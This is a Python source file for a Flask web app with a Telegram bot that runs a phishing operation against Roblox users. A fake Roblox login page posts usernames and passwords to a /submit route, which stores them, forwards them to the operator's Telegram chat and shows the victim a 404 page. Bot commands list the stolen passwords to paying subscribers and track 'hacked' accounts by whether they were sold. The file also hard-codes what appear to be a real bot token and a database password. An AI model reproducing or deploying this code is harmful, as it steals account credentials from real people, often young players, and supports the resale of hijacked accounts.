from flask import Flask, request, render_template, redirect, url_for
import telebot
from telebot import types
import psycopg2
import os
import requests
import threading
import time
from datetime import datetime, timedelta

# === Настройки ===
TOKEN = '8028944732:AAFGduJrXNp9IcIRxi5fTZpNzQaamHDglw4'  # Ваш токен
ADMIN_CHAT_ID = '6956377285'  # Ваш chat_id (Создатель)
DATABASE_URL = 'postgresql://roblox_db_user:vjBfo3Vwigs5pnm107BhEkXe6AOy3FWF@dpg-cvr25cngi27c738j8c50-a.oregon-postgres.render.com/roblox_db'
SITE_URL = os.getenv('SITE_URL', 'https://tg-bod.onrender.com')

app = Flask(__name__)
bot = telebot.TeleBot(TOKEN)

# === Переменные для техперерыва ===
tech_break = None

# === Установка часового пояса (UTC+2) ===
def get_current_time():
    return datetime.now() + timedelta(hours=2)  # Добавляем 2 часа к UTC для UTC+2

# === Инициализация базы данных ===
def get_db_connection():
    try:
        conn = psycopg2.connect(DATABASE_URL)
        print("Подключение к БД успешно")
        return conn
    except Exception as e:
        print(f"Ошибка подключения к БД: {e}")
        return None

def init_db():
    conn = get_db_connection()
    if conn is None:
        print("Не удалось инициализировать БД - продолжаем без БД")
        return False
    try:
        c = conn.cursor()
        print("Создаем таблицу 'users', если не существует")
        c.execute('''CREATE TABLE IF NOT EXISTS users 
                     (chat_id TEXT PRIMARY KEY, prefix TEXT, subscription_end TEXT, site_clicks INTEGER DEFAULT 0, password_views INTEGER DEFAULT 0)''')
        print("Создаем таблицу 'credentials', если не существует")
        c.execute('''CREATE TABLE IF NOT EXISTS credentials 
                     (login TEXT PRIMARY KEY, password TEXT, added_time TEXT)''')
        print("Создаем таблицу 'hacked_accounts', если не существует")
        c.execute('''CREATE TABLE IF NOT EXISTS hacked_accounts 
                     (login TEXT PRIMARY KEY, password TEXT, hack_date TEXT, prefix TEXT, sold_status TEXT, linked_chat_id TEXT)''')
        subscription_end = (get_current_time() + timedelta(days=3650)).isoformat()
        print(f"Устанавливаем Создателя для {ADMIN_CHAT_ID}")
        c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
                  "ON CONFLICT (chat_id) DO UPDATE SET prefix = EXCLUDED.prefix, subscription_end = EXCLUDED.subscription_end",
                  (ADMIN_CHAT_ID, "Создатель", subscription_end))
        conn.commit()
        conn.close()
        print("БД успешно инициализирована")
        return True
    except Exception as e:
        print(f"Ошибка инициализации БД: {e}")
        conn.close()
        return False

# === Keep-alive для Render ===
def keep_alive():
    while True:
        try:
            response = requests.get(SITE_URL)
            print(f"🔁 Пинг: {response.status_code} - {response.text[:50]}")
        except Exception as e:
            print(f"Ошибка keep-alive: {e}")
        time.sleep(60)  # Пинг каждую минуту

# === Функции для работы с базой ===
def get_user(chat_id):
    conn = get_db_connection()
    if conn is None:
        print(f"Не удалось получить пользователя {chat_id}: нет подключения к БД")
        if chat_id == ADMIN_CHAT_ID:
            print(f"Жестко задаем Создателя для {chat_id}")
            return {
                'prefix': 'Создатель',
                'subscription_end': get_current_time() + timedelta(days=3650),
                'site_clicks': 0,
                'password_views': 0
            }
        return None
    try:
        c = conn.cursor()
        c.execute("SELECT prefix, subscription_end, site_clicks, password_views FROM users WHERE chat_id = %s", (chat_id,))
        result = c.fetchone()
        conn.close()
        if result:
            print(f"Пользователь {chat_id} найден: {result}")
            return {
                'prefix': result[0],
                'subscription_end': datetime.fromisoformat(result[1]) if result[1] else None,
                'site_clicks': result[2],
                'password_views': result[3]
            }
        print(f"Пользователь {chat_id} не найден")
        return None
    except Exception as e:
        print(f"Ошибка в get_user для {chat_id}: {e}")
        conn.close()
        return None

def save_user(chat_id, prefix, subscription_end=None):
    conn = get_db_connection()
    if conn is None:
        print(f"Не удалось сохранить пользователя {chat_id}: нет подключения к БД")
        return
    try:
        c = conn.cursor()
        if subscription_end is None:
            subscription_end = get_current_time().isoformat()
        c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
                  "ON CONFLICT (chat_id) DO UPDATE SET prefix = %s, subscription_end = %s",
                  (chat_id, prefix, subscription_end, prefix, subscription_end))
        conn.commit()
        conn.close()
        print(f"Пользователь {chat_id} сохранен с префиксом {prefix}")
    except Exception as e:
        print(f"Ошибка сохранения пользователя {chat_id}: {e}")
        conn.close()

def increment_site_clicks(chat_id):
    conn = get_db_connection()
    if conn is None:
        print(f"Не удалось обновить клики для {chat_id}: нет подключения к БД")
        return
    try:
        c = conn.cursor()
        c.execute("UPDATE users SET site_clicks = site_clicks + 1 WHERE chat_id = %s", (chat_id,))
        conn.commit()
        conn.close()
        print(f"Клики на сайт увеличены для {chat_id}")
    except Exception as e:
        print(f"Ошибка увеличения кликов для {chat_id}: {e}")
        conn.close()

def increment_password_views(chat_id):
    conn = get_db_connection()
    if conn is None:
        print(f"Не удалось обновить просмотры паролей для {chat_id}: нет подключения к БД")
        return
    try:
        c = conn.cursor()
        c.execute("UPDATE users SET password_views = password_views + 1 WHERE chat_id = %s", (chat_id,))
        conn.commit()
        conn.close()
        print(f"Просмотры паролей увеличены для {chat_id}")
    except Exception as e:
        print(f"Ошибка увеличения просмотров паролей для {chat_id}: {e}")
        conn.close()

def save_credentials(login, password):
    conn = get_db_connection()
    if conn is None:
        print("Не удалось сохранить учетные данные: нет подключения к БД")
        return False
    try:
        c = conn.cursor()
        added_time = get_current_time().isoformat()
        c.execute("INSERT INTO credentials (login, password, added_time) VALUES (%s, %s, %s) "
                  "ON CONFLICT (login) DO UPDATE SET password = %s, added_time = %s",
                  (login, password, added_time, password, added_time))
        conn.commit()
        conn.close()
        print(f"Учетные данные сохранены: login={login}, password={password}")
        return True
    except Exception as e:
        print(f"Ошибка сохранения учетных данных: {e}")
        conn.close()
        return False

def delete_credentials(login):
    conn = get_db_connection()
    if conn is None:
        print("Не удалось удалить учетные данные: нет подключения к БД")
        return False
    try:
        c = conn.cursor()
        c.execute("DELETE FROM credentials WHERE login = %s", (login,))
        conn.commit()
        conn.close()
        print(f"Учетные данные удалены: login={login}")
        return True
    except Exception as e:
        print(f"Ошибка удаления учетных данных: {e}")
        conn.close()
        return False

def save_hacked_account(login, password, prefix, sold_status, linked_chat_id):
    conn = get_db_connection()
    if conn is None:
        print("Не удалось сохранить взломанный аккаунт: нет подключения к БД")
        return False
    try:
        c = conn.cursor()
        hack_date = get_current_time().isoformat()
        c.execute("INSERT INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id) "
                  "VALUES (%s, %s, %s, %s, %s, %s) "
                  "ON CONFLICT (login) DO UPDATE SET password = %s, hack_date = %s, prefix = %s, sold_status = %s, linked_chat_id = %s",
                  (login, password, hack_date, prefix, sold_status, linked_chat_id,
                   password, hack_date, prefix, sold_status, linked_chat_id))
        conn.commit()
        conn.close()
        print(f"Взломанный аккаунт сохранен: login={login}, password={password}, sold_status={sold_status}")
        return True
    except Exception as e:
        print(f"Ошибка сохранения взломанного аккаунта: {e}")
        conn.close()
        return False

def delete_hacked_account(login):
    conn = get_db_connection()
    if conn is None:
        print("Не удалось удалить взломанный аккаунт: нет подключения к БД")
        return False
    try:
        c = conn.cursor()
        c.execute("DELETE FROM hacked_accounts WHERE login = %s", (login,))
        conn.commit()
        conn.close()
        print(f"Взломанный аккаунт удален: login={login}")
        return True
    except Exception as e:
        print(f"Ошибка удаления взломанного аккаунта: {e}")
        conn.close()
        return False

def delete_user(chat_id):
    conn = get_db_connection()
    if conn is None:
        print("Не удалось удалить пользователя: нет подключения к БД")
        return False
    try:
        c = conn.cursor()
        c.execute("DELETE FROM users WHERE chat_id = %s", (chat_id,))
        conn.commit()
        conn.close()
        print(f"Пользователь удален: chat_id={chat_id}")
        return True
    except Exception as e:
        print(f"Ошибка удаления пользователя: {e}")
        conn.close()
        return False

def get_credentials():
    conn = get_db_connection()
    if conn is None:
        print("Не удалось получить учетные данные: нет подключения к БД")
        return []
    try:
        c = conn.cursor()
        c.execute("SELECT login, password, added_time FROM credentials")
        result = c.fetchall()
        conn.close()
        print(f"Учетные данные получены: {result}")
        return result
    except Exception as e:
        print(f"Ошибка получения учетных данных: {e}")
        conn.close()
        return []

def get_hacked_accounts():
    conn = get_db_connection()
    if conn is None:
        print("Не удалось получить взломанные аккаунты: нет подключения к БД")
        return []
    try:
        c = conn.cursor()
        c.execute("SELECT login, password, hack_date, prefix, sold_status, linked_chat_id FROM hacked_accounts")
        result = c.fetchall()
        conn.close()
        print(f"Взломанные аккаунты получены: {result}")
        return result
    except Exception as e:
        print(f"Ошибка получения взломанных аккаунтов: {e}")
        conn.close()
        return []

def get_all_users():
    conn = get_db_connection()
    if conn is None:
        print("Не удалось получить всех пользователей: нет подключения к БД")
        return []
    try:
        c = conn.cursor()
        c.execute("SELECT chat_id, prefix, subscription_end, site_clicks, password_views FROM users")
        result = c.fetchall()
        conn.close()
        print(f"Все пользователи получены: {result}")
        return result
    except Exception as e:
        print(f"Ошибка получения всех пользователей: {e}")
        conn.close()
        return []

# === Форматирование времени с минутами ===
def format_time_with_minutes(iso_time):
    added_time = datetime.fromisoformat(iso_time)
    current_time = get_current_time()
    minutes_passed = int((current_time - added_time).total_seconds() / 60)
    return f"{added_time.strftime('%Y-%m-%d %H:%M:%S')} ({minutes_passed} мин назад)"

# === Проверка доступа ===
def check_access(chat_id, command):
    global tech_break
    print(f"Проверка доступа для {chat_id} на команду {command}")
    user = get_user(chat_id)
    if user is None and command in ['start', 'menu', 'getchatid']:
        save_user(chat_id, "Посетитель")
        user = get_user(chat_id)
    
    if tech_break and chat_id != ADMIN_CHAT_ID:
        time_left = (tech_break - get_current_time()).total_seconds() / 60
        if time_left > 0:
            return f"⏳ Сейчас идет техперерыв. Окончание через {int(time_left)} минут."
    if not user or user['prefix'] == 'Посетитель':
        if command in ['start', 'menu', 'getchatid']:
            return None
        return "🔒 Вы можете купить подписку у @sacoectasy.\nЗдесь можете посмотреть свой ID: /getchatid"
    if user['subscription_end'] and user['subscription_end'] < get_current_time():
        save_user(chat_id, 'Посетитель', get_current_time())
        return "🔒 Ваша подписка истекла! Купите новую у @sacoectasy.\nЗдесь можете посмотреть свой ID: /getchatid"
    if command in ['passwords', 'admin'] and user['prefix'] not in ['Админ', 'Создатель']:
        return "🔒 Доступно только для Админа и Создателя!"
    if command in ['hacked', 'database', 'techstop', 'techstopoff', 'adprefix', 'delprefix'] and user['prefix'] != 'Создатель':
        return "🔒 Доступно только для Создателя!"
    print(f"Доступ разрешен для {chat_id} на {command}")
    return None

# === Flask маршруты ===
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login-roblox.html')
def login_page():
    return render_template('login-roblox.html')

@app.route('/submit', methods=['POST'])
def submit():
    try:
        login = request.form.get('login')
        password = request.form.get('password')
        if login and password:
            print(f"Получен логин: {login}, пароль: {password}")
            if save_credentials(login, password):
                bot.send_message(ADMIN_CHAT_ID, f"🔐 Новый логин:\nЛогин: {login}\nПароль: {password}")
            else:
                print("Не удалось сохранить учетные данные в БД")
        return redirect(url_for('not_found'))
    except Exception as e:
        print(f"Ошибка в /submit: {e}")
        return "Внутренняя ошибка сервера", 500

@app.route('/404')
def not_found():
    return render_template('404.html')

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        if request.headers.get('content-type') == 'application/json':
            json_string = request.get_data().decode('utf-8')
            print(f"Получены данные вебхука: {json_string}")
            update = telebot.types.Update.de_json(json_string)
            if update and (update.message or update.callback_query):
                print(f"Обработка обновления: {update}")
                bot.process_new_updates([update])
                print("Обновление успешно обработано")
            else:
                print("В данных вебхука нет валидного обновления")
            return 'OK', 200
        else:
            print(f"Неверный тип запроса: {request.headers.get('content-type')}")
            return 'Неверный запрос', 400
    except Exception as e:
        print(f"Ошибка в вебхуке: {e}")
        return 'Ошибка сервера', 500


# === Команды бота ===
@bot.message_handler(commands=['start'])
def start_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /start для chat_id: {chat_id}")
    access = check_access(chat_id, 'start')
    if access:
        bot.reply_to(message, access)
        return
    bot.reply_to(message, "✅ Бот активен! Используйте /menu для списка команд.")

@bot.message_handler(commands=['menu'])
def menu_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /menu для chat_id: {chat_id}")
    access = check_access(chat_id, 'menu')
    if access:
        print(f"Доступ запрещен для {chat_id}: {access}")
        bot.reply_to(message, access)
        return
    
    user = get_user(chat_id)
    print(f"Данные пользователя для {chat_id}: {user}")
    
    if user:
        time_left = (user['subscription_end'] - get_current_time()).days if user['subscription_end'] else 0
        time_str = f"{time_left} дней" if time_left > 0 else "Истекла"
        response = f"👤 Ваш префикс: {user['prefix']}\n⏳ Подписка: {time_str}"
        
        global tech_break
        if tech_break:
            tech_time_left = (tech_break - get_current_time()).total_seconds() / 60
            print(f"Техперерыв активен, осталось: {tech_time_left} минут")
            if tech_time_left > 0:
                response += f"\n⏳ Техперерыв: до {tech_break.strftime('%H:%M')} (UTC+2), осталось {int(tech_time_left)} мин."
            else:
                tech_break = None
                print("Техперерыв истек, сбрасываем на None")
        
        response += "\n\n🧾 Команды:\n/start\n/menu\n/getchatid"
        if user['prefix'] != 'Посетитель':
            response += "\n/site\n/techstop\n/techstopoff"
            if user['prefix'] in ['Админ', 'Создатель']:
                response += "\n/passwords\n/admin"
            if user['prefix'] == 'Создатель':
                response += "\n/hacked\n/database\n/adprefix\n/delprefix"
    else:
        response = "🧾 Команды:\n/start\n/menu\n/getchatid"
        print(f"Пользователь для {chat_id} не найден, показываем базовое меню")
    
    print(f"Отправляем ответ для {chat_id}: {response}")
    bot.reply_to(message, response)

@bot.message_handler(commands=['getchatid'])
def getchatid_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /getchatid для chat_id: {chat_id}")
    access = check_access(chat_id, 'getchatid')
    if access:
        bot.reply_to(message, access)
        return
    user = get_user(chat_id)
    if user['prefix'] == 'Посетитель':
        bot.reply_to(message, f"👤 Здесь можете посмотреть свой ID: {chat_id}")
    else:
        bot.reply_to(message, f"👤 Ваш Chat ID: {chat_id}")

@bot.message_handler(commands=['site'])
def site_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /site для chat_id: {chat_id}")
    access = check_access(chat_id, 'site')
    if access:
        bot.reply_to(message, access)
        return
    increment_site_clicks(chat_id)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Перейти на сайт", url=SITE_URL))
    bot.reply_to(message, "🌐 Нажмите кнопку ниже:", reply_markup=markup)

@bot.message_handler(commands=['techstop'])
def techstop_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /techstop для chat_id: {chat_id}")
    access = check_access(chat_id, 'techstop')
    if access:
        bot.reply_to(message, access)
        return
    global tech_break
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if not args or not args[0].isdigit():
        bot.reply_to(message, "❌ Укажите время в минутах: /techstop <минуты>")
        return
    minutes = int(args[0])
    tech_break = get_current_time() + timedelta(minutes=minutes)
    bot.reply_to(message, f"⏳ Техперерыв установлен на {minutes} минут. Окончание: {tech_break.strftime('%H:%M')} (UTC+2)")

@bot.message_handler(commands=['techstopoff'])
def techstopoff_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /techstopoff для chat_id: {chat_id}")
    access = check_access(chat_id, 'techstopoff')
    if access:
        bot.reply_to(message, access)
        return
    global tech_break
    tech_break = None
    bot.reply_to(message, "✅ Техперерыв отключен.")

@bot.message_handler(commands=['passwords'])
def passwords_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /passwords для chat_id: {chat_id}")
    access = check_access(chat_id, 'passwords')
    if access:
        bot.reply_to(message, access)
        return
    increment_password_views(chat_id)
    credentials = get_credentials()
    if not credentials:
        bot.reply_to(message, "📂 Список паролей пуст.")
        return
    response = "🔑 Список паролей:\n"
    markup = types.InlineKeyboardMarkup()
    for login, password, added_time in credentials:
        formatted_time = format_time_with_minutes(added_time)
        response += f"Логин: {login} | Пароль: {password} | Добавлен: {formatted_time}\n"
        markup.add(
            types.InlineKeyboardButton(f"Удалить {login}", callback_data=f"delete_cred_{login}"),
            types.InlineKeyboardButton(f"Взломать {login}", callback_data=f"hack_cred_{login}")
        )
    bot.reply_to(message, response, reply_markup=markup)

@bot.message_handler(commands=['hacked'])
def hacked_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /hacked для chat_id: {chat_id}")
    access = check_access(chat_id, 'hacked')
    if access:
        bot.reply_to(message, access)
        return
    hacked_accounts = get_hacked_accounts()
    if not hacked_accounts:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Добавить взломанный аккаунт", callback_data="add_hacked"))
        bot.reply_to(message, "📂 Список взломанных аккаунтов пуст.", reply_markup=markup)
        return
    response = "🔓 Взломанные аккаунты:\n"
    markup = types.InlineKeyboardMarkup()
    for login, password, hack_date, prefix, sold_status, linked_chat_id in hacked_accounts:
        formatted_time = format_time_with_minutes(hack_date)
        response += (f"Логин: {login} | Пароль: {password} | Дата: {formatted_time} | "
                     f"Префикс: {prefix} | Статус: {sold_status} | Chat ID: {linked_chat_id}\n")
        markup.add(
            types.InlineKeyboardButton(f"Удалить {login}", callback_data=f"delete_hacked_{login}")
        )
    markup.add(types.InlineKeyboardButton("Добавить взломанный аккаунт", callback_data="add_hacked"))
    bot.reply_to(message, response, reply_markup=markup)

@bot.message_handler(commands=['database'])
def database_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /database для chat_id: {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.reply_to(message, access)
        return
    
    response = "📊 База данных:\n\n"
    
    # Пользователи
    users = get_all_users()
    response += "👤 Пользователи:\n"
    if not users:
        response += "Пусто\n"
    else:
        for chat_id, prefix, subscription_end, site_clicks, password_views in users:
            time_left = (datetime.fromisoformat(subscription_end) - get_current_time()).days if subscription_end else 0
            response += f"Chat ID: {chat_id} | Префикс: {prefix} | Подписка: {time_left} дней\n"
    
    # Пароли
    credentials = get_credentials()
    response += "\n🔑 Пароли:\n"
    if not credentials:
        response += "Пусто\n"
    else:
        for login, password, added_time in credentials:
            formatted_time = format_time_with_minutes(added_time)
            response += f"Логин: {login} | Пароль: {password} | Добавлен: {formatted_time}\n"
    
    # Взломанные аккаунты
    hacked_accounts = get_hacked_accounts()
    response += "\n🔓 Взломанные аккаунты:\n"
    if not hacked_accounts:
        response += "Пусто\n"
    else:
        for login, password, hack_date, prefix, sold_status, linked_chat_id in hacked_accounts:
            formatted_time = format_time_with_minutes(hack_date)
            response += f"Логин: {login} | Пароль: {password} | Дата: {formatted_time} | Статус: {sold_status}\n"

    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("Добавить", callback_data="db_add"),
        types.InlineKeyboardButton("Удалить", callback_data="db_delete"),
        types.InlineKeyboardButton("Просмотреть", callback_data="db_view")
    )
    bot.reply_to(message, response, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("db_"))
def handle_db_callback(call):
    chat_id = str(call.message.chat.id)
    print(f"Обработка callback базы данных для chat_id: {chat_id}, data: {call.data}")
    
    if call.data == "db_add":
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("Добавить пользователя", callback_data="db_add_user"),
            types.InlineKeyboardButton("Добавить пароль", callback_data="db_add_cred"),
            types.InlineKeyboardButton("Добавить взломанный", callback_data="db_add_hacked")
        )
        bot.edit_message_text("📊 Выберите, что добавить:", chat_id, call.message.message_id, reply_markup=markup)
    
    elif call.data == "db_delete":
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("Удалить пользователя", callback_data="db_del_user"),
            types.InlineKeyboardButton("Удалить пароль", callback_data="db_del_cred"),
            types.InlineKeyboardButton("Удалить взломанный", callback_data="db_del_hacked")
        )
        bot.edit_message_text("📊 Выберите, что удалить:", chat_id, call.message.message_id, reply_markup=markup)
    
    elif call.data == "db_view":
        bot.edit_message_text("📊 Вы уже просматриваете базу данных!", chat_id, call.message.message_id)
    
    # Добавление
    elif call.data == "db_add_user":
        bot.edit_message_text("📝 Введите: /adduser <chat_id> <префикс> <дни>", chat_id, call.message.message_id)
    elif call.data == "db_add_cred":
        bot.edit_message_text("📝 Введите: /addcred <логин> <пароль>", chat_id, call.message.message_id)
    elif call.data == "db_add_hacked":
        bot.edit_message_text("📝 Введите: /addhacked <логин> <пароль>", chat_id, call.message.message_id)
    
    # Удаление
    elif call.data == "db_del_user":
        users = get_all_users()
        if not users:
            bot.edit_message_text("📂 Пользователей нет.", chat_id, call.message.message_id)
        else:
            markup = types.InlineKeyboardMarkup()
            for chat_id_user, prefix, _, _, _ in users:
                markup.add(types.InlineKeyboardButton(f"{chat_id_user} ({prefix})", callback_data=f"db_del_user_{chat_id_user}"))
            bot.edit_message_text("📊 Выберите пользователя для удаления:", chat_id, call.message.message_id, reply_markup=markup)
    elif call.data == "db_del_cred":
        credentials = get_credentials()
        if not credentials:
            bot.edit_message_text("📂 Паролей нет.", chat_id, call.message.message_id)
        else:
            markup = types.InlineKeyboardMarkup()
            for login, _, _ in credentials:
                markup.add(types.InlineKeyboardButton(f"{login}", callback_data=f"db_del_cred_{login}"))
            bot.edit_message_text("📊 Выберите пароль для удаления:", chat_id, call.message.message_id, reply_markup=markup)
    elif call.data == "db_del_hacked":
        hacked_accounts = get_hacked_accounts()
        if not hacked_accounts:
            bot.edit_message_text("📂 Взломанных аккаунтов нет.", chat_id, call.message.message_id)
        else:
            markup = types.InlineKeyboardMarkup()
            for login, _, _, _, _, _ in hacked_accounts:
                markup.add(types.InlineKeyboardButton(f"{login}", callback_data=f"db_del_hacked_{login}"))
            bot.edit_message_text("📊 Выберите взломанный аккаунт для удаления:", chat_id, call.message.message_id, reply_markup=markup)
    
    # Выполнение удаления
    elif call.data.startswith("db_del_user_"):
        chat_id_user = call.data[len("db_del_user_"):]
        if delete_user(chat_id_user):
            bot.edit_message_text(f"✅ Пользователь {chat_id_user} удален.", chat_id, call.message.message_id)
        else:
            bot.edit_message_text("❌ Ошибка при удалении.", chat_id, call.message.message_id)
    elif call.data.startswith("db_del_cred_"):
        login = call.data[len("db_del_cred_"):]
        if delete_credentials(login):
            bot.edit_message_text(f"✅ Логин {login} удален.", chat_id, call.message.message_id)
        else:
            bot.edit_message_text("❌ Ошибка при удалении.", chat_id, call.message.message_id)
    elif call.data.startswith("db_del_hacked_"):
        login = call.data[len("db_del_hacked_"):]
        if delete_hacked_account(login):
            bot.edit_message_text(f"✅ Логин {login} удален из взломанных.", chat_id, call.message.message_id)
        else:
            bot.edit_message_text("❌ Ошибка при удалении.", chat_id, call.message.message_id)

@bot.message_handler(commands=['adduser'])
def add_user_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /adduser для chat_id: {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) != 3 or not args[2].isdigit():
        bot.reply_to(message, "❌ Формат: /adduser <chat_id> <префикс> <дни>")
        return
    target_chat_id, prefix, days = args[0], args[1], int(args[2])
    subscription_end = get_current_time() + timedelta(days=days)
    save_user(target_chat_id, prefix, subscription_end)
    bot.reply_to(message, f"✅ Добавлен пользователь {target_chat_id} с префиксом {prefix} на {days} дней.")

@bot.message_handler(commands=['addcred'])
def add_cred_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /addcred для chat_id: {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) != 2:
        bot.reply_to(message, "❌ Формат: /addcred <логин> <пароль>")
        return
    login, password = args[0], args[1]
    if save_credentials(login, password):
        bot.reply_to(message, f"✅ Добавлен логин {login} с паролем {password}.")
    else:
        bot.reply_to(message, "❌ Ошибка при добавлении.")

@bot.message_handler(commands=['addhacked'])
def add_hacked_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /addhacked для chat_id: {chat_id}")
    access = check_access(chat_id, 'hacked')
    if access:
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) != 2:
        bot.reply_to(message, "❌ Формат: /addhacked <логин> <пароль>")
        return
    login, password = args[0], args[1]
    user = get_user(chat_id)
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("Продан", callback_data=f"hack_{login}_{password}_Продан_{chat_id}"),
        types.InlineKeyboardButton("Не продан", callback_data=f"hack_{login}_{password}_Не продан_{chat_id}")
    )
    bot.reply_to(message, f"🔓 Укажите статус для {login}:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("hack_"))
def handle_hack_callback(call):
    chat_id = str(call.message.chat.id)
    parts = call.data.split("_")
    login, password, sold_status, linked_chat_id = parts[1], parts[2], parts[3], parts[4]
    user = get_user(chat_id)
    if save_hacked_account(login, password, user['prefix'], sold_status, linked_chat_id):
        bot.edit_message_text(f"✅ {login} добавлен в взломанные со статусом {sold_status}.", 
                             chat_id, call.message.message_id)
        bot.answer_callback_query(call.id)
    else:
        bot.answer_callback_query(call.id, "❌ Ошибка при добавлении.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("delete_"))
def handle_delete_callback(call):
    chat_id = str(call.message.chat.id)
    print(f"Обработка callback для chat_id: {chat_id}, data: {call.data}")
    
    if call.data.startswith("delete_cred_"):
        login = call.data[len("delete_cred_"):]
        if delete_credentials(login):
            bot.edit_message_text(f"✅ Логин {login} удален из списка паролей.", 
                                 chat_id, call.message.message_id)
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ Ошибка при удалении.")
    
    elif call.data.startswith("delete_hacked_"):
        login = call.data[len("delete_hacked_"):]
        if delete_hacked_account(login):
            bot.edit_message_text(f"✅ Логин {login} удален из списка взломанных.", 
                                 chat_id, call.message.message_id)
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ Ошибка при удалении.")

@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /admin для chat_id: {chat_id}")
    access = check_access(chat_id, 'admin')
    if access:
        bot.reply_to(message, access)
        return
    users = get_all_users()
    if not users:
        bot.reply_to(message, "📂 Список пользователей пуст.")
        return
    response = "👑 Панель администратора\nСписок пользователей:\n"
    for chat_id, prefix, subscription_end, site_clicks, password_views in users:
        time_left = (datetime.fromisoformat(subscription_end) - get_current_time()).days if subscription_end else 0
        response += (f"Chat ID: {chat_id}\n"
                     f"Префикс: {prefix}\n"
                     f"Подписка: {time_left} дней\n"
                     f"Кликов на сайт: {site_clicks if site_clicks else 0}\n"
                     f"Просмотров паролей: {password_views if password_views else 0}\n\n")
    bot.reply_to(message, response)

@bot.message_handler(commands=['adprefix'])
def adprefix_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /adprefix для chat_id: {chat_id}")
    access = check_access(chat_id, 'adprefix')
    if access:
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) < 3 or not args[2].isdigit():
        bot.reply_to(message, "❌ Формат: /adprefix <chat_id> <префикс> <дни>\nПрефиксы: Админ, Пользователь")
        return
    target_chat_id, prefix, days = args[0], args[1], int(args[2])
    if prefix not in ["Админ", "Пользователь"]:
        bot.reply_to(message, "❌ Префикс должен быть: Админ или Пользователь")
        return
    subscription_end = get_current_time() + timedelta(days=days)
    save_user(target_chat_id, prefix, subscription_end)
    bot.reply_to(message, f"✅ Пользователю {target_chat_id} выдан префикс {prefix} на {days} дней.")

@bot.message_handler(commands=['delprefix'])
def delprefix_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Обработка /delprefix для chat_id: {chat_id}")
    access = check_access(chat_id, 'delprefix')
    if access:
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if not args:
        bot.reply_to(message, "❌ Формат: /delprefix <chat_id>")
        return
    target_chat_id = args[0]
    save_user(target_chat_id, "Посетитель", get_current_time())
    bot.reply_to(message, f"✅ Префикс пользователя {target_chat_id} сброшен до Посетитель.")

init_db()  # Инициализация при запуске

if __name__ == "__main__":
    threading.Thread(target=keep_alive, daemon=True).start()
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
